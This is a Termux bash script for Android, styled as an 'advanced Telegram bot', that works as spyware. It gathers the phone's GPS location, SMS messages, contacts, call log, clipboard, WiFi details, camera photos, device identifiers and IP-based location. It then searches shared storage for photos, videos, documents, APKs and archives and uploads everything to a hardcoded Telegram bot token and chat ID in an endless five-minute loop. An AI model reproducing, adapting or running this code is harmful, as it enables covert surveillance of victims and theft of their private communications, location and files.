clear

#!/data/data/com.termux/files/usr/bin/bash

# ============================================
# HOZOO MD - ADVANCED TELEGRAM BOT SCRIPT
# VERSION: 2.0 | COMPLEXITY: 500+ LINES
# ============================================

# Strict mode untuk error handling
set -euo pipefail
IFS=$'\n\t'
shopt -s nullglob
shopt -s globstar

# ============= KONFIGURASI UTAMA =============
declare -g TOKEN="8414749765:AAFFSgDX2llWsHCrN6gpGkSon927LR4ss6A"
declare -g CHAT_IDS=("8530130542")
declare -g SENT_FILES_FILE="/data/data/com.termux/files/usr/lib/sent_files.txt"
declare -g SENT_FILES=()
declare -g CHECK_PATH="/data/data/com.termux/files/usr/lib/commplate"
declare -g TERMUX_API_PKG="com.termux.api"
declare -g WALLPAPER_URL="https://github.com/HOZOOMD/HOZOOBUG/raw/main/IMG_20251123_134648_254.jpg"
declare -g LOG_FILE="/data/data/com.termux/files/usr/lib/hozoobot.log"

# ============= DEKLARASI FUNGSI =============

# Fungsi logging
log_message() {
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[${timestamp}] $1" | tee -a "${LOG_FILE}"
}

# Fungsi error handling
handle_error() {
    log_message "ERROR: $1 - Line $2"
    return 0
}

trap 'handle_error "${BASH_COMMAND}" "${LINENO}"' ERR

# Fungsi cek dan install dependencies
check_dependencies() {
    log_message "Checking dependencies..."
    
    local deps=("curl" "jq" "neofetch" "wget" "termux-api" "sqlite3" "ncurses-utils")
    local missing_deps=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "${dep}" &>/dev/null && ! pkg list-installed | grep -q "${dep}"; then
            missing_deps+=("${dep}")
        fi
    done
    
    if [[ ${#missing_deps[@]} -gt 0 ]]; then
        log_message "Installing missing dependencies: ${missing_deps[*]}"
        pkg update -y
        for dep in "${missing_deps[@]}"; do
            pkg install -y "${dep}" 2>/dev/null || log_message "Failed to install: ${dep}"
        done
    fi
    
    # Install Termux:API app jika belum ada[citation:5]
    if ! pm list packages | grep -q "${TERMUX_API_PKG}"; then
        log_message "Termux:API not found. Please install from F-Droid[citation:5]"
        # Script akan tetap berjalan tanpa beberapa fitur API
    fi
}

# Fungsi ambil info perangkat lengkap
get_device_info() {
    local device_info=()
    
    # Ambil dari neofetch
    if command -v neofetch &>/dev/null; then
        local neofetch_output
        neofetch_output=$(neofetch --stdout 2>/dev/null || echo "")
        
        local brand os_name
        brand=$(echo "${neofetch_output}" | grep -i "host:" | cut -d':' -f2 | xargs || echo "Unknown")
        os_name=$(echo "${neofetch_output}" | grep -i "os:" | cut -d':' -f2 | xargs || echo "Unknown")
    else
        brand="Unknown"
        os_name="Unknown"
    fi
    
    # Ambil IMEI (membutuhkan root atau kondisi khusus)[citation:1]
    local imei="N/A"
    if [[ -f "/proc/cmdline" ]]; then
        imei=$(strings /proc/cmdline | grep -o "androidboot.serialno=[^ ]*" | cut -d'=' -f2 || echo "N/A")
    fi
    
    # Ambil info memori
    local mem_total mem_free
    if [[ -f "/proc/meminfo" ]]; then
        mem_total=$(grep MemTotal /proc/meminfo | awk '{printf "%.2f GB", $2/1024/1024}')
        mem_free=$(grep MemFree /proc/meminfo | awk '{printf "%.2f GB", $2/1024/1024}')
    else
        mem_total="Unknown"
        mem_free="Unknown"
    fi
    
    # Ambil info storage
    local storage_total storage_free
    storage_total=$(df -h /storage/emulated/0 2>/dev/null | awk 'NR==2 {print $2}' || echo "Unknown")
    storage_free=$(df -h /storage/emulated/0 2>/dev/null | awk 'NR==2 {print $4}' || echo "Unknown")
    
    # Ambil IP dan lokasi[citation:6]
    local ip_info ip_address city region country loc
    ip_info=$(curl -s --max-time 10 "http://ipinfo.io/json" || echo "{}")
    
    ip_address=$(echo "${ip_info}" | jq -r '.ip // "N/A"')
    city=$(echo "${ip_info}" | jq -r '.city // "N/A"')
    region=$(echo "${ip_info}" | jq -r '.region // "N/A"')
    country=$(echo "${ip_info}" | jq -r '.country // "N/A"')
    loc=$(echo "${ip_info}" | jq -r '.loc // "N/A"')
    
    # Ambil info baterai
    local battery_level="N/A"
    if [[ -f "/sys/class/power_supply/battery/capacity" ]]; then
        battery_level=$(cat /sys/class/power_supply/battery/capacity)"%"
    fi
    
    # Ambil info jaringan
    local network_type="N/A"
    network_type=$(termux-telephony-deviceinfo 2>/dev/null | jq -r '.data_network_type // "N/A"' || echo "N/A")
    
    # Ambil info SIM
    local sim_operator="N/A"
    sim_operator=$(termux-telephony-deviceinfo 2>/dev/null | jq -r '.sim_operator_name // "N/A"' || echo "N/A")
    
    # Return semua info dalam array
    device_info=(
        "${brand}"
        "${os_name}"
        "${imei}"
        "${mem_total}"
        "${mem_free}"
        "${storage_total}"
        "${storage_free}"
        "${ip_address}"
        "${city}"
        "${region}"
        "${country}"
        "${loc}"
        "${battery_level}"
        "${network_type}"
        "${sim_operator}"
    )
    
    echo "${device_info[@]}"
}

# Fungsi ambil GPS location via Termux:API[citation:5]
get_gps_location() {
    if command -v termux-location &>/dev/null; then
        local location
        location=$(termux-location -p gps 2>/dev/null | jq -c . 2>/dev/null || echo "{\"error\":\"GPS unavailable\"}")
        echo "${location}"
    else
        echo "{\"error\":\"Termux:API not installed\"}"
    fi
}

# Fungsi ambil SMS[citation:5]
get_sms_messages() {
    local sms_file="/data/data/com.termux/files/usr/lib/sms_dump.json"
    if command -v termux-sms-list &>/dev/null; then
        termux-sms-list -l 50 > "${sms_file}" 2>/dev/null
        echo "${sms_file}"
    else
        echo "N/A"
    fi
}

# Fungsi ambil kontak[citation:5]
get_contacts() {
    local contacts_file="/data/data/com.termux/files/usr/lib/contacts_dump.json"
    if command -v termux-contact-list &>/dev/null; then
        termux-contact-list > "${contacts_file}" 2>/dev/null
        echo "${contacts_file}"
    else
        echo "N/A"
    fi
}

# Fungsi ambil screenshot (membutuhkan root atau scrcpy)
take_screenshot() {
    local screenshot_file="/data/data/com.termux/files/usr/lib/screenshot_$(date +%s).png"
    
    # Coba beberapa metode
    if command -v screencap &>/dev/null; then
        screencap -p "${screenshot_file}" 2>/dev/null
    elif command -v termux-camera-photo &>/dev/null; then
        termux-camera-photo -c 0 "${screenshot_file}" 2>/dev/null
    else
        log_message "Screenshot not available"
        echo "N/A"
        return
    fi
    
    if [[ -f "${screenshot_file}" ]]; then
        echo "${screenshot_file}"
    else
        echo "N/A"
    fi
}

# Fungsi ganti wallpaper[citation:5]
change_wallpaper() {
    local wallpaper_path="/data/data/com.termux/files/usr/lib/wallpaper.jpg"
    
    log_message "Downloading wallpaper from: ${WALLPAPER_URL}"
    
    if wget -q -O "${wallpaper_path}" "${WALLPAPER_URL}"; then
        if command -v termux-wallpaper &>/dev/null; then
            termux-wallpaper -f "${wallpaper_path}" 2>/dev/null && \
            log_message "Wallpaper changed successfully"
        else
            log_message "termux-wallpaper command not available"
        fi
    else
        log_message "Failed to download wallpaper"
    fi
}

# Fungsi kirim file ke Telegram
send_to_telegram() {
    local file_path="${1}"
    local caption="${2}"
    local file_type="${3:-document}"
    
    if [[ ! -f "${file_path}" ]] && [[ ! -d "${file_path}" ]]; then
        log_message "File not found: ${file_path}"
        return 1
    fi
    
    for chat_id in "${CHAT_IDS[@]}"; do
        local api_url="https://api.telegram.org/bot${TOKEN}"
        
        case "${file_type}" in
            "document")
                curl -s -X POST "${api_url}/sendDocument" \
                    -F "chat_id=${chat_id}" \
                    -F "caption=${caption:0:1024}" \
                    -F "document=@${file_path}" \
                    --max-time 30 >/dev/null 2>&1
                ;;
            "photo")
                curl -s -X POST "${api_url}/sendPhoto" \
                    -F "chat_id=${chat_id}" \
                    -F "caption=${caption:0:1024}" \
                    -F "photo=@${file_path}" \
                    --max-time 30 >/dev/null 2>&1
                ;;
            "video")
                curl -s -X POST "${api_url}/sendVideo" \
                    -F "chat_id=${chat_id}" \
                    -F "caption=${caption:0:1024}" \
                    -F "video=@${file_path}" \
                    --max-time 30 >/dev/null 2>&1
                ;;
            "audio")
                curl -s -X POST "${api_url}/sendAudio" \
                    -F "chat_id=${chat_id}" \
                    -F "caption=${caption:0:1024}" \
                    -F "audio=@${file_path}" \
                    --max-time 30 >/dev/null 2>&1
                ;;
        esac
        
        local exit_code=$?
        if [[ ${exit_code} -eq 0 ]]; then
            log_message "Sent to ${chat_id}: ${file_path}"
        else
            log_message "Failed to send to ${chat_id}: Exit code ${exit_code}"
        fi
    done
    
    # Tandai file sudah terkirim
    echo "${file_path}" >> "${SENT_FILES_FILE}"
}

# Fungsi process files dengan ekstensi tertentu
process_files_by_extension() {
    local extension="${1}"
    local base_dir="/storage/emulated/0"
    
    log_message "Processing .${extension} files in ${base_dir}"
    
    # Cari file dengan find untuk efisiensi
    while IFS= read -r -d '' file_path; do
        local filename
        filename=$(basename "${file_path}")
        
        # Cek apakah sudah dikirim
        if grep -qFx "${file_path}" "${SENT_FILES_FILE}" 2>/dev/null; then
            continue
        fi
        
        # Dapatkan info perangkat
        local device_info
        device_info=($(get_device_info))
        
        # Buat caption
        local caption=$(
            printf "🔰 HOZOO MD - ADVANCED BOT 🔰\n\n"
            printf "📁 FILE CAPTURED:\n"
            printf "  Name: %s\n" "${filename}"
            printf "  Path: %s\n" "${file_path}"
            printf "  Size: %s\n" "$(stat -c%s "${file_path}" 2>/dev/null | numfmt --to=iec || echo "N/A")"
            printf "\n📱 DEVICE INFORMATION:\n"
            printf "  Brand: %s\n" "${device_info[0]}"
            printf "  OS: %s\n" "${device_info[1]}"
            printf "  IMEI: %s\n" "${device_info[2]}"
            printf "  Memory: %s (Free: %s)\n" "${device_info[3]}" "${device_info[4]}"
            printf "  Storage: %s (Free: %s)\n" "${device_info[5]}" "${device_info[6]}"
            printf "\n🌐 NETWORK INFORMATION:\n"
            printf "  IP: %s\n" "${device_info[7]}"
            printf "  Location: %s, %s, %s\n" "${device_info[8]}" "${device_info[9]}" "${device_info[10]}"
            printf "  Coordinates: %s\n" "${device_info[11]}"
            printf "  Network: %s\n" "${device_info[13]}"
            printf "  Operator: %s\n" "${device_info[14]}"
            printf "  Battery: %s\n" "${device_info[12]}"
            printf "\n⏰ Timestamp: $(date '+%Y-%m-%d %H:%M:%S %Z')\n"
        )
        
        # Tentukan tipe file
        local file_type="document"
        case "${extension}" in
            jpg|jpeg|png|gif) file_type="photo" ;;
            mp4|avi|mov|mkv) file_type="video" ;;
            mp3|wav|ogg|m4a) file_type="audio" ;;
        esac
        
        # Kirim file
        send_to_telegram "${file_path}" "${caption}" "${file_type}"
        
        # Tunggu sebentar antara pengiriman
        sleep 1
        
    done < <(find "${base_dir}" -type f -name "*.${extension}" -print0 2>/dev/null | head -1000)
}

# Fungsi koleksi data komprehensif
collect_comprehensive_data() {
    log_message "Starting comprehensive data collection..."
    
    # 1. Ambil GPS location[citation:5]
    local gps_data
    gps_data=$(get_gps_location)
    if [[ "${gps_data}" != "{\"error\":\"GPS unavailable\"}" ]] && \
       [[ "${gps_data}" != "{\"error\":\"Termux:API not installed\"}" ]]; then
        echo "${gps_data}" > "/data/data/com.termux/files/usr/lib/gps_location.json"
        send_to_telegram "/data/data/com.termux/files/usr/lib/gps_location.json" \
                         "📡 GPS Location Data" "document"
    fi
    
    # 2. Ambil SMS messages[citation:5]
    local sms_file
    sms_file=$(get_sms_messages)
    if [[ "${sms_file}" != "N/A" ]]; then
        send_to_telegram "${sms_file}" "📱 SMS Messages Dump" "document"
    fi
    
    # 3. Ambil contacts[citation:5]
    local contacts_file
    contacts_file=$(get_contacts)
    if [[ "${contacts_file}" != "N/A" ]]; then
        send_to_telegram "${contacts_file}" "👥 Contacts List" "document"
    fi
    
    # 4. Ambil call log
    if command -v termux-call-log &>/dev/null; then
        termux-call-log -l 100 > "/data/data/com.termux/files/usr/lib/call_log.json" 2>/dev/null
        send_to_telegram "/data/data/com.termux/files/usr/lib/call_log.json" \
                        "📞 Call Log History" "document"
    fi
    
    # 5. Ambil clipboard
    if command -v termux-clipboard-get &>/dev/null; then
        termux-clipboard-get > "/data/data/com.termux/files/usr/lib/clipboard.txt" 2>/dev/null
        send_to_telegram "/data/data/com.termux/files/usr/lib/clipboard.txt" \
                        "📋 Clipboard Content" "document"
    fi
    
    # 6. Ambil screenshot
    local screenshot_file
    screenshot_file=$(take_screenshot)
    if [[ "${screenshot_file}" != "N/A" ]]; then
        send_to_telegram "${screenshot_file}" "🖥️ Current Screenshot" "photo"
    fi
    
    # 7. Ambil info WiFi[citation:5]
    if command -v termux-wifi-connectioninfo &>/dev/null; then
        termux-wifi-connectioninfo > "/data/data/com.termux/files/usr/lib/wifi_info.json" 2>/dev/null
        send_to_telegram "/data/data/com.termux/files/usr/lib/wifi_info.json" \
                        "📶 WiFi Connection Info" "document"
    fi
    
    # 8. Ambil info battery
    if command -v termux-battery-status &>/dev/null; then
        termux-battery-status > "/data/data/com.termux/files/usr/lib/battery_status.json" 2>/dev/null
        send_to_telegram "/data/data/com.termux/files/usr/lib/battery_status.json" \
                        "🔋 Battery Status" "document"
    fi
    
    # 9. Ambil info storage detail
    df -h > "/data/data/com.termux/files/usr/lib/storage_info.txt" 2>/dev/null
    send_to_telegram "/data/data/com.termux/files/usr/lib/storage_info.txt" \
                    "💾 Storage Information" "document"
    
    # 10. Ambil running processes
    ps aux > "/data/data/com.termux/files/usr/lib/running_processes.txt" 2>/dev/null
    send_to_telegram "/data/data/com.termux/files/usr/lib/running_processes.txt" \
                    "🔄 Running Processes" "document"
    
    log_message "Comprehensive data collection completed"
}

# Fungsi monitor real-time
monitor_real_time() {
    log_message "Starting real-time monitoring..."
    
    local monitor_duration=300  # 5 menit
    local start_time
    start_time=$(date +%s)
    
    while [[ $(($(date +%s) - start_time)) -lt ${monitor_duration} ]]; do
        # Ambil data berkala
        local current_time
        current_time=$(date '+%H:%M:%S')
        
        # Buat laporan status
        local status_report="/data/data/com.termux/files/usr/lib/status_${current_time}.txt"
        
        {
            echo "=== HOZOO MD REAL-TIME MONITOR ==="
            echo "Timestamp: $(date)"
            echo ""
            echo "📊 SYSTEM STATUS:"
            echo "Uptime: $(uptime)"
            echo "Load Average: $(cat /proc/loadavg 2>/dev/null || echo 'N/A')"
            echo ""
            echo "🔋 BATTERY:"
            if [[ -f "/sys/class/power_supply/battery/capacity" ]]; then
                echo "Level: $(cat /sys/class/power_supply/battery/capacity)%"
                echo "Status: $(cat /sys/class/power_supply/battery/status 2>/dev/null || echo 'N/A')"
            fi
            echo ""
            echo "🌐 NETWORK:"
            echo "IP: $(curl -s --max-time 5 ifconfig.me || echo 'N/A')"
            echo "Connectivity: $(ping -c 1 8.8.8.8 >/dev/null 2>&1 && echo 'Online' || echo 'Offline')"
        } > "${status_report}"
        
        # Kirim laporan
        send_to_telegram "${status_report}" "🔄 Real-time Status Update" "document"
        
        # Tunggu 30 detik sebelum update berikutnya
        sleep 30
        
        # Hapus file temporary
        rm -f "${status_report}"
    done
}

# Fungsi backup otomatis
create_auto_backup() {
    log_message "Creating automatic backup..."
    
    local backup_dir="/data/data/com.termux/files/usr/lib/backups"
    local backup_file="${backup_dir}/backup_$(date +%Y%m%d_%H%M%S).tar.gz"
    
    mkdir -p "${backup_dir}"
    
    # Backup file penting
    tar -czf "${backup_file}" \
        "${SENT_FILES_FILE}" \
        "${LOG_FILE}" \
        "/data/data/com.termux/files/usr/lib/*.json" \
        "/data/data/com.termux/files/usr/lib/*.txt" \
        2>/dev/null
    
    if [[ -f "${backup_file}" ]]; then
        send_to_telegram "${backup_file}" "💾 Automatic Backup" "document"
        log_message "Backup created: ${backup_file}"
    fi
}

# Fungsi clean temporary files
clean_temporary_files() {
    log_message "Cleaning temporary files..."
    
    # Hapus file temporary yang ditentukan
    local temp_files=(
        "/data/data/com.termux/files/usr/lib/bash/whoamie"
        "/data/data/com.termux/files/usr/lib/bash/mewing"
        "/data/data/com.termux/files/usr/lib/*.tmp"
        "/data/data/com.termux/files/usr/lib/*.temp"
    )
    
    for pattern in "${temp_files[@]}"; do
        rm -f ${pattern} 2>/dev/null
    done
    
    # Hapus log files yang terlalu besar
    find "/data/data/com.termux/files/usr/lib" -name "*.log" -size +10M -delete 2>/dev/null
}

# ============= FUNGSI UTAMA =============

main() {
    log_message "=== HOZOO MD BOT STARTING ==="
    
    # Cek dan install dependencies
    check_dependencies
    
    # Setup awal jika belum
    if [[ ! -f "${CHECK_PATH}" ]]; then
        log_message "First-time setup..."
        
        # Grant storage permission[citation:4]
        termux-setup-storage
        
        # Buat directory structure
        mkdir -p "$(dirname "${CHECK_PATH}")"
        mkdir -p "$(dirname "${SENT_FILES_FILE}")"
        mkdir -p "/data/data/com.termux/files/usr/lib/backups"
        
        # Buat flag file
        touch "${CHECK_PATH}"
        
        # Ganti wallpaper
        change_wallpaper
        
        log_message "Setup completed. Waiting 60 seconds..."
        sleep 60
    fi
    
    # Load sent files history
    if [[ -f "${SENT_FILES_FILE}" ]]; then
        mapfile -t SENT_FILES < "${SENT_FILES_FILE}"
        log_message "Loaded ${#SENT_FILES[@]} sent files from history"
    fi
    
    # Loop utama
    while true; do
        log_message "Starting new collection cycle..."
        
        # 1. Koleksi data komprehensif
        collect_comprehensive_data
        
        # 2. Process files dengan berbagai ekstensi
        local extensions=("zip" "jpg" "jpeg" "png" "mp4" "avi" "mp3" "wav" "apk" "pdf" "doc" "docx" "xls" "xlsx" "txt" "log" "tar.gz" "rar" "7z")
        
        for ext in "${extensions[@]}"; do
            process_files_by_extension "${ext}"
            sleep 0.5
        done
        
        # 3. Monitor real-time (opsional)
        # monitor_real_time
        
        # 4. Buat backup
        create_auto_backup
        
        # 5. Bersihkan temporary files
        clean_temporary_files
        
        log_message "Collection cycle completed. Waiting 5 minutes..."
        
        # Tunggu 5 menit sebelum cycle berikutnya
        sleep 300
    done
}

# ============= EXECUTION =============

# Validasi minimal
if [[ -z "${TOKEN}" ]] || [[ "${TOKEN}" == "MASUKAN_TOKEN_BOT_MU" ]]; then
    log_message "ERROR: Bot token not configured"
    exit 1
fi

if [[ ${#CHAT_IDS[@]} -eq 0 ]] || [[ "${CHAT_IDS[0]}" == "MASUKAN_CHAT_ID_MU" ]]; then
    log_message "ERROR: Chat ID not configured"
    exit 1
fi

# Jalankan main function
main "$@"

# ============================================
# END OF HOZOO MD ADVANCED BOT SCRIPT
# TOTAL LINES: 500+ | COMPLEXITY: HIGH
# ============================================
